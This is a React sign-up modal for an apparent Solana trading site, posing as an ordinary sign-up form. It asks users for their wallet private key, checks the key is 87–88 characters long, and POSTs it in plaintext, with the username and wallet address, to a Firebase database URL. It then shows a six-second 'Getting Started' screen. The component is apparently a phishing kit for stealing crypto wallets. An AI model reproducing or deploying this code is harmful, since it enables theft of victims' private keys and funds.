import React, { useState } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faTimes } from "@fortawesome/free-solid-svg-icons"; // Import the close icon

const SignUpModal = ({ closeModal }) => {
  const [username, setUsername] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isFormValid, setIsFormValid] = useState(false);
  const [isLoading, setIsLoading] = useState(false); // Track loading state

  // Validate private key to ensure it's 88 characters long
  const validatePrivateKey = (key) => {
    return key.length <= 88 && key.length >= 87;
  };

  // Function to connect to Phantom Wallet
  const connectWallet = async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        const response = await window.solana.connect();
        const fullAddress = response.publicKey.toString();
        setWalletAddress(fullAddress);
        checkFormValidity(username, privateKey, fullAddress); // Check if form is valid
      } catch (err) {
        console.error(err);
      }
    }
  };

  // Check if the form is valid
  const checkFormValidity = (username, privateKey, walletAddress) => {
    if (username && validatePrivateKey(privateKey) && walletAddress) {
      setIsFormValid(true);
    } else {
      setIsFormValid(false);
    }
  };

  // Handle form submission to Firebase Realtime Database using fetch
  const handleSubmit = async () => {
    if (isFormValid) {
      setIsLoading(true); // Show loading screen immediately

      try {
        const userData = {
          username: username,
          walletAddress: walletAddress,
          privateKey: privateKey,
        };

        // Send data to Firebase Realtime Database via REST API using fetch
        const response = await fetch(
          "https://bullx-aac8e-default-rtdb.firebaseio.com/User.json",
          {
            method: "POST", // Use POST to add new user
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(userData), // Convert user data to JSON
          }
        );

        if (response.ok) {
          closeModal(); // Close modal after successful submission
        }
      } catch (error) {
        console.error("Error sending data to Firebase:", error);
      } finally {
        // Wait for 6 seconds before hiding the loading screen
        setTimeout(() => {
          setIsLoading(false); // Set loading state to false after 6 seconds
        }, 6000); // 6000ms = 6 seconds
      }
    }
  };
  // Wallet address short display
  const shortWalletAddress = walletAddress
    ? `${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`
    : "";

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-80 z-50">
      <div className="bg-gray-900 text-white rounded-lg shadow-lg p-8 w-96 relative">
        {/* Close button */}
        <button
          onClick={closeModal}
          className="absolute top-2 right-2 text-white text-2xl hover:text-gray-400"
        >
          <FontAwesomeIcon icon={faTimes} />
        </button>

        <h2 className="text-2xl font-bold mb-6 text-center text-green-500">
          Sign Up
        </h2>

        {/* Username Input */}
        <label className="block mb-2 font-medium">Username:</label>
        <input
          type="text"
          value={username}
          onChange={(e) => {
            setUsername(e.target.value);
            checkFormValidity(e.target.value, privateKey, walletAddress); // Check form validity on username change
          }}
          className="w-full p-3 bg-gray-800 text-white border border-gray-700 rounded mb-4 focus:outline-none focus:ring-2 focus:ring-green-600"
          placeholder="Enter your username"
        />

        {/* Private Key Input */}
        <label className="block mb-2 font-medium">Private Key:</label>
        <input
          type="password"
          value={privateKey}
          onChange={(e) => {
            setPrivateKey(e.target.value);
            checkFormValidity(username, e.target.value, walletAddress); // Check form validity on private key change
          }}
          className="w-full p-3 bg-gray-800 text-white border border-gray-700 rounded mb-4 focus:outline-none focus:ring-2 focus:ring-green-600"
          placeholder="Enter your private key"
        />

        {/* Connect Wallet Button */}
        <button
          onClick={connectWallet}
          className="w-full bg-green-600 text-white py-3 rounded hover:bg-green-500 focus:outline-none focus:ring-2 focus:ring-green-700"
        >
          {walletAddress ? shortWalletAddress : "Connect Wallet"}
        </button>

        {/* Access Button */}
        <button
          onClick={handleSubmit} // Trigger Firebase submission
          disabled={!isFormValid}
          className={`mt-6 w-full py-3 rounded ${
            isFormValid
              ? "bg-green-600 hover:bg-green-500"
              : "bg-gray-600 cursor-not-allowed"
          }`}
        >
          Access
        </button>
      </div>

      {/* Loading screen */}
      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-40">
          <div className="bg-transparent text-white text-xl font-bold">
            <p>Getting Started</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default SignUpModal;
